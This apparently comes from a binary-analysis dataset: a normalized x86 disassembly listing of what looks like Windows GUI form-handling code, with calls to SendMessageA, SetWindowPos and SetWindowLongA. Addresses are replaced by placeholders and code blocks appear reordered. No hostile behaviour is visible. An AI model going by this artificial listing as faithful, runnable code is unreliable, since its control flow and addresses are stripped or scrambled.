push r-xdata
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_44920c
push 0x0
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_467010
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4489f4
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_466fe0
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_463bb0
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_463bb0
jmp r-xdata
sub_465bad
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_469620
call sub_403970
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_464900
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44cd30
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_44f7d8
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
call SetWindowPos
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465ca8
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_44f7d8
call sub_460528
mov ebx eax
sub_465cf4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
retn
mov eax [ rw-data ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
sub_465d4c
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
cmp [ esi + 0x59 ] 0x0
je r-xdata
pop esi
pop ecx
pop ebp
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_424098
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_465daa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x68 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403128
retn
mov eax [ esi + 0x68 ]
mov edx [ edx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
sub_465db8
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
mov si 0xffab
call sub_403324
test al al
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_465de4
push ebx
push esi
push ecx
mov ebx eax
test [ ebx + 0x2f4 ] 0x8
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov [ ebx + 0x24c ] 0x2
jmp r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov [ esp ] 0x1
test [ ebx + 0x228 ] 0x2
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov [ esp ] 0x3
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_46960c
jmp r-xdata
mov edx esp
mov eax ebx
mov si 0xffb0
call sub_403324
cmp [ esp ] 0x0
je r-xdata
cmp [ esp ] 0x3
jne r-xdata
mov eax ebx
call sub_465f84
jmp r-xdata
mov eax ebx
call sub_466020
mov dl 0x1
mov eax ebx
call sub_463b70
jmp r-xdata
sub_465e88
push ebx
push esi
push edi
push ecx
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x29a ] 0x0
je r-xdata
mov [ esp ] 0x0
mov eax ebx
call sub_4634fc
mov esi eax
dec esi
test esi esi
jl r-xdata
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x29c ]
call [ ebx + 0x298 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax ebx
call sub_463548
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
sub_465eec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_465f58
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
mov [ ebp - 0x5 ] 0x1
lea edx [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_403324
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_466020
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_465fa4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_466012
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22e ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466019
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7fc
call sub_4038f4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_4647fc
sub_46603c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_466304
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_4477e4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7fc
call sub_4038f4
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call ReleaseCapture
mov eax [ rw-data ]
call sub_468580
xor edx edx
push ebp
push sub_4662e7
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x8
call GetActiveWindow
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov ecx [ eax + 0x78 ]
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
xor edx edx
call sub_41877c
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x78 ] edx
mov eax [ rw-data ]
mov ax [ eax + 0x44 ]
mov [ ebp - 0x12 ] ax
xor edx edx
mov eax [ rw-data ]
call sub_467554
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x18 ] eax
xor eax eax
call sub_4603d8
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_4662c5
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_465f8c
xor edx edx
push ebp
push sub_466224
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24c ] 0x2
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_465eec
call GetCapture
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_46938c
mov eax [ rw-data ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov [ ebp - 0x8 ] eax
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
call sub_44f7d8
mov ebx eax
call GetActiveWindow
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46622b
mov eax [ ebp - 0x4 ]
call sub_465f84
retn
xor eax eax
mov [ ebp - 0x1c ] eax
sub_46622b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4662cf
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_467554
mov dx [ ebp - 0x12 ]
mov eax [ rw-data ]
call sub_467554
jmp r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov eax ebx
call sub_4186f8
mov esi eax
mov eax [ rw-data ]
mov [ eax + 0x78 ] esi
mov edx esi
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
call sub_41889c
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_46048c
mov eax [ rw-data ]
mov ebx [ eax + 0x7c ]
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x10 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xf7
retn
mov eax [ ebp - 0x1c ]
push eax
call SetActiveWindow
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_466314
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c508
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_466314
pop ecx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_44c4cc
mov ebx eax
test [ ebx + 0x51 ] 0x80
je r-xdata
sub_466384
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov esi [ ebx + 0x248 ]
test esi esi
je r-xdata
push ebp
mov eax ebx
call sub_466314
pop ecx
mov eax [ esi + 0x34 ]
call sub_45b830
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebx + 0x248 ]
mov eax [ eax + 0x34 ]
mov edx edi
call sub_45b840
cmp [ eax + 0x3e ] 0x0
je r-xdata
sub_466408
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44db28
cmp [ esi + 0x4 ] 0x2f
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffd0
call sub_403324
sub_46642c
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff3
call sub_403324
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_46645c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_44c508
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_46642c
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_46645c
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_44c4cc
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4664d8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_46642c
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_46642c
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_46645c
pop ecx
test al al
je r-xdata
sub_46652c
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff0
call sub_403324
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_46655c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_44c508
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_46652c
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_46655c
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_44c4cc
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4665d8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_46652c
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_46652c
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_46655c
pop ecx
test al al
je r-xdata
sub_46662c
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
test eax eax
je r-xdata
xor eax eax
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
mov edx esi
call sub_418700
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_4557b4
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_466680
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c2 ] 0x0
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c4 ]
call [ ebx + 0x2c0 ]
mov al 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x248 ]
test ebx ebx
je r-xdata
push ebp
call sub_46662c
pop ecx
test al al
jne r-xdata
cmp [ ebx + 0x38 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
mov si 0xffef
call sub_403324
test al al
jne r-xdata
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4666fc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x250 ] 0x0
je r-xdata
push edi
push esi
push ebx
call sub_4214dc
jmp r-xdata
push edi
push esi
mov eax [ ebx + 0x250 ]
push eax
mov eax [ eax ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
sub_466738
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x224 ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_449490
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx 0xb043
mov eax edi
call sub_44a198
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_466780
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_44fadc
test al al
je r-xdata
push 0xffffffec
mov eax ebx
call sub_44f7d8
push eax
call GetWindowLongA
mov esi eax
cmp [ ebx + 0x2e0 ] 0x0
jne r-xdata
test esi 0x80000
jne r-xdata
cmp [ ebx + 0x2e8 ] 0x0
je r-xdata
xor eax eax
mov al [ ebx + 0x2e0 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x2e8 ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebx + 0x2e1 ]
push eax
mov eax [ ebx + 0x2ec ]
push eax
mov eax ebx
call sub_44f7d8
push eax
call [ rw-data ]
jmp r-xdata
or esi 0x80000
push esi
push 0xffffffec
mov eax ebx
call sub_44f7d8
push eax
call SetWindowLongA
and esi 0xfff7ffff
push esi
push 0xffffffec
mov eax ebx
call sub_44f7d8
push eax
call SetWindowLongA
push 0x485
push 0x0
push 0x0
mov eax ebx
call sub_44f7d8
push eax
call RedrawWindow
sub_4668d4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
push 0x0
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0xe0 ]
xor edx edx
mov eax ebx
call sub_461684
mov dl 0x5
mov eax ebx
call sub_4633f8
mov dl 0x1
mov eax ebx
call sub_44e3b4
mov dl 0x3
mov eax ebx
call sub_4636f4
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_46693c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_466a13
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_44e274
dec eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_44e0e0
mov dl 0x5
mov eax [ ebp - 0x4 ]
call sub_448498
test [ esi + 0x1c ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_448f20
mov ecx eax
inc ecx
lea eax [ ebp - 0xc ]
xor edx edx
call sub_403fa8
mov eax [ ebp - 0xc ]
call sub_404178
push eax
mov eax [ ebp - 0xc ]
call sub_404378
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_448f30
mov eax [ ebp - 0xc ]
call sub_404178
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466a1a
lea eax [ ebp - 0xc ]
call sub_403eb8
retn
mov dl 0x1
mov eax esi
call sub_462a78
mov edx [ ebp - 0xc ]
mov eax esi
call sub_448fdc
mov ebx 0x1
mov edx ebx
dec edx
lea eax [ ebp - 0xc ]
call sub_404504
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_466a40
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_44c508
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebx
call sub_46219c
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebp ebp
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push esp
mov edx ebp
mov eax ebx
call sub_44c4cc
mov edx ebx
pop ecx
mov si 0xffcc
call sub_403324
inc ebp
dec edi
jne r-xdata
sub_466a8c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
call sub_44e274
test eax eax
mov eax [ ebp + 0x8 ]
sete [ eax ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_466ab8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44ea7c
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x2
sub_466ae0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_464e48
cmp [ ebx + 0x9b ] 0x1
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_44f7d8
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax ebx
call sub_44e274
test eax eax
jle r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_44f7d8
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_44f7d8
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_44e288
or ecx 0xffffffff
mov dl 0x1
call sub_44968c
pop esi
pop ebx
retn
sub_466b78
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_44eeec
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
push eax
xor ecx ecx
mov edx 0xb039
mov eax esi
call sub_44a198
mov edi [ ebx + 0x4 ]
cmp esi [ edi + 0xa0 ]
jne r-xdata
mov edx esp
mov eax edi
call sub_44894c
mov ecx esp
mov eax edi
or edx 0xffffffff
mov si 0xffcc
call sub_403324
sub_466bd0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_466c96
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_448f20
mov ecx eax
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_403fa8
mov eax [ ebp - 0x4 ]
call sub_404178
push eax
mov eax [ ebp - 0x4 ]
call sub_404378
mov edx eax
mov eax [ ebx + 0x4 ]
pop ecx
call sub_448f30
mov eax [ ebp - 0x4 ]
call sub_404178
test eax eax
jle r-xdata
sub eax 0xafff
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_448fdc
mov ebx 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466c9d
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
mov eax [ ebx + 0x4 ]
mov dl [ eax + 0x57 ]
mov eax esi
call sub_462a78
jmp r-xdata
mov edx ebx
dec edx
lea eax [ ebp - 0x4 ]
call sub_404504
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_466cbc
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_44ec6c
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_44e274
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_44e288
mov dl [ ebx + 0x57 ]
call sub_448ecc
inc edi
dec esi
jne r-xdata
sub_466d60
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
